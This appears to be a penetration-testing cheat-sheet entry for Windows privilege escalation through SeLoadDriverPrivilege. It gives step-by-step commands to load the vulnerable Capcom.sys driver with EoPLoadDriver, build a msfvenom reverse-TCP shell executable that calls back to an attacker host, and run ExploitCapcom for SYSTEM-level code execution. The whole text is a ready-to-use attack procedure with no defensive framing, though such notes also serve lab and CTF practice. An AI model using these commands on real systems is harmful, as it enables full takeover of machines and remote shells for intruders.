# SeLoadDriverPrivilege EoPLoadDriver + Capcom.sys

If `whoami /priv` shows `SeLoadDriverPrivilege`, load vulnerable Capcom.sys driver to execute arbitrary code as SYSTEM.

**Tools needed (compile on Windows):**
- EoPLoadDriver.exe (TarLogic) — loads the driver via registry
- ExploitCapcom.exe (tandasat) — exploits Capcom driver IOCTL
- Modify ExploitCapcom to run custom payload path before compiling

**Upload and execute:**
```cmd
# Upload Capcom.sys, EoPLoadDriver.exe, ExploitCapcom.exe, rev.exe
EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys
# Expected: NTSTATUS: 00000000

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f exe -o rev.exe

# Run exploit (rev.exe must be at path hardcoded in ExploitCapcom)
ExploitCapcom.exe
```

**If CreateFile fails:** driver not loaded, re-run EoPLoadDriver.
